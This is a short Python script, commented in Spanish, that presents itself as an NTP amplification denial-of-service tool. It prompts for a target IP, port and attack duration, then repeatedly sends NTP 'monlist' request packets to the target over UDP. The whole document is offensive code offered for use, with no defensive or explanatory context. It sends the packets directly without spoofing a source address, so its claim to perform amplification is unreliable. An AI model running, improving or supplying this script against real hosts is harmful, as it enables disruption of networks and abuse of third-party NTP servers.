import socket
import time

# Solicitar datos al usuario
target_ip = input("Introduce la IP de destino: ")
target_port = int(input("Introduce el puerto de destino: "))
duration = int(input("Introduce la duración del ataque en segundos: "))

# Payload para NTP Amplification (comando 'monlist')
ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

end_time = time.time() + duration

try:
    while time.time() < end_time:
        sock.sendto(ntp_payload, (target_ip, target_port))
        time.sleep(1)  # Puedes ajustar el delay si lo deseas
    print("\nAtaque completado.")
except KeyboardInterrupt:
    print("\nEnvío detenido por el usuario.")
finally:
    sock.close()
